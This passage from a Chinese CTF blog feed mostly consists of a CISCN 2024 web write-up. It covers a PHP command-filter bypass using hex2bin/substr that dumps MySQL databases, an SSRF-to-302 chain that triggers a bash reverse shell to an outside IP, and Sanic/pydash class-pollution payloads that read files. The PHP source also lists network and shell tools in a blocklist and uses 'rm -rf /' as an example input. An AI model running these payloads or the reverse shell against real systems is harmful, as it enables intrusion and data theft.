invoke__">set_opt</span>(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mysql&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mysql&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$my</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mysql&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">real_connect</span>(<span class="variable">$my</span>[<span class="string">&#x27;host&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;dbname&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;port&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;connect success&quot;</span>;</span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;show databases;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;connect fail&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&quot;function.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HNCTF-2022-WEEK2-easy-sql&quot;&gt;&lt;a href=&quot;#HNCTF-2022-WEEK2-easy-sql&quot; class=&quot;headerlink&quot; title=&quot;[HNCTF 2022 WEEK2]easy_sql&quot;&gt;&lt;/a&gt;[HNCTF 202</summary>
      
    
    
    
    <category term="sql刷题笔记" scheme="https://gu0f3n.github.io/categories/sql%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="SQL" scheme="https://gu0f3n.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Ciscn2024web复现</title>
    <link href="https://gu0f3n.github.io/2024/07/30/Ciscn2024web%E5%A4%8D%E7%8E%B0/"/>
    <id>https://gu0f3n.github.io/2024/07/30/Ciscn2024web%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-07-30T08:09:48.000Z</published>
    <updated>2024-08-01T13:13:48.145Z</updated>
    
    <content type="html"><![CDATA[<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">   <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">     <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>**<code>ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);</code>**：设置 <code>open_basedir</code> 配置选项，限制 PHP 只能访问 <code>/var/www/html/</code> 目录及其子目录</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><code>**escapeshellcmd**</code> 是一个 PHP 内置函数，用于转义传递给 shell 的字符串，以防止命令注入攻击。它的主要作用是确保用户输入的字符串在作为 shell 命令的一部分执行时不会被解释为特殊字符或命令。这个函数会在某些有特殊含义的字符前添加反斜杠，从而使这些字符失去特殊含义。</p><p>eg:</p><p>假设有以下用户输入：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$input</span> = <span class="string">&#x27;cat /etc/passwd; rm -rf /&#x27;</span>;</span><br></pre></td></tr></table></figure><p>使用 <code>escapeshellcmd</code> 转义后：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$escaped_input</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$escaped_input</span>;</span><br></pre></td></tr></table></figure><p>输出将会是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat\ /etc/passwd\;\ rm\ -rf\ /</span><br></pre></td></tr></table></figure><p>而且这里过滤了很多东西</p><p>跟着wp复现</p><p><code>php -r</code> 是 PHP 命令行界面（CLI）的一部分，它允许你直接在命令行中运行 PHP 代码，而无需创建一个文件来包含这些代码。<code>-r</code> 选项用于指定一段将被执行的 PHP 代码</p><p><img src="/imgs/2024%E5%B9%B47%E6%9C%8830%E6%97%A516%E7%82%B959%E5%88%86.png" alt="image-20240730165912695"></p><p>发现可以直接执行</p><p>那么我们这就可以命令执行</p><p>由于绕过的函数有些多，我们可以使用hex2bin()函数进行16进制转字符进行绕过</p><p>但发现直接<strong>php -r eval(hex2bin(73797374656d2827707327293b));</strong></p><p>行不通</p><p>发现hex2bin需要的参数是一个字符串类型的数字，直接两个双引号呢？</p><p>不行 gg 准备跑路</p><p>但是总有大佬能想出来</p><p><strong>substr()</strong> 这个就有点牛逼了</p><p>我们知道</p><p><strong>自动类型转换（Type Juggling）</strong></p><p>PHP 是一种弱类型语言，它支持自动类型转换，称为“类型杂耍”（type juggling）。这意味着 PHP 会在需要时自动将一种数据类型转换为另一种数据类型。这种转换在函数参数传递时特别常见。</p><p>当你传递一个数字给 <code>substr()</code> 的 <code>$string</code> 参数时，PHP 会自动将这个数字转换为字符串。这是因为 <code>substr()</code> 函数的<strong>第一个参数需要一个字符串</strong>，而 PHP 会尝试将传递的任何数据转换为期望的类型。</p><p>所以我们这里payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r eval(hex2bin(substr(Gu0f3n73797374656d28276c73202f27293b,6)));</span><br></pre></td></tr></table></figure><p>成功执行 </p><p>查找&#x2F;目录发现没东西 但是 ps 发现有sql进程</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo `mysql -u root -p&#x27;root&#x27; -e &#x27;show databases;&#x27;`;</span></span><br><span class="line">cmd=php+-r+<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(Gu0f3n6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773686f77206461746162617365733b27603b,<span class="number">6</span>)));</span><br></pre></td></tr></table></figure><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A510%E7%82%B953%E5%88%86.png" alt="image-20240801105235342"></p><p>爆出库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># select * from PHP_CMS.F1ag_Se3Re7;</span><br><span class="line">cmd=php+-r+eval(hex2bin(substr(Gu0f3n6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773656c656374202a2066726f6d205048505f434d532e463161675f5365335265373b27603b,6)));</span><br></pre></td></tr></table></figure><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A510%E7%82%B955%E5%88%86.png" alt="image_5"></p><p>还有个更简单的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases</span><br></pre></td></tr></table></figure><p>直接把所有库的所有数据查出来 然后找flag</p><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>hint:简单的cms，可以扫扫看？ 提示1： &#x2F;flag.php： </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">   echo &quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;;</span><br><span class="line">   return;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示2：github找一下源码?</p><p>找到源码</p><p><a href="https://github.com/dayrui/xunruicms">https://github.com/dayrui/xunruicms</a></p><p>信息打点 发现这个cms的漏洞公示<a href="https://www.xunruicms.com/bug/">https://www.xunruicms.com/bug/</a></p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B908%E5%88%86.png" alt="image-20240801200813912"></p><p>定位路径xunruicms-master\dayrui\Fcms\Control\Api\Api.php</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B910%E5%88%86.png" alt="image-20240801201003706"></p><p>ssrf漏洞</p><p>定位这个函数<strong>dr_catcher_data</strong></p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B911%E5%88%86.png" alt="image-20240801201134900"></p><p>试了下输入本地不行</p><p>302跳转</p><p>自己vps上面构建302.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.149.246.169%2F2222%200%3E%261%22&quot;</span>);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://vps:7777/ctf/302.php&amp;size=6666&amp;level=1</span><br></pre></td></tr></table></figure><p>反弹shell</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B916%E5%88%86.png" alt="image-20240801201517830"></p><p>卡了？ 试了几次都这样 </p><p>gg 跑路 复现失败 ┭┮﹏┭┮</p><h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><p>依旧是这位大佬gxngxngxn</p><p>参考</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p><p>进入src路由</p><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br></pre></td></tr></table></figure><p>分析下这段 在&#x2F;login路由处我们需要绕过**user.lower() &#x3D;&#x3D; ‘adm;n’**的限制，由于这里是从session中读取，所以默认是会在分号处截断，直接传肯定是不行的</p><p>利用八进制绕过</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B926%E5%88%86.png" alt="image-20240801202640883"></p><p>原理之前DASCTF复现的时候讲过了</p><p>所以直接上操作</p><p>得到admin的session</p><p>进入admin</p><p>直接污染</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>得到flag名</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A521%E7%82%B908%E5%88%86.png" alt="image-20240801210841152"></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/24bcbd0192e591d6ded1_flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>访问src 拿flag</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A521%E7%82%B910%E5%88%86.png" alt="image-20240801211003726"></p><h2 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h2><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;simple-php&quot;&gt;&lt;a href=&quot;#simple-php&quot; class=&quot;headerlink&quot; title=&quot;simple_php&quot;&gt;&lt;/a&gt;simple_php&lt;/h2&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="ciscn" scheme="https://gu0f3n.github.io/categories/ciscn/"/>
    
    
    <category term="复现" scheme="https://gu0f3n.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
</feed>
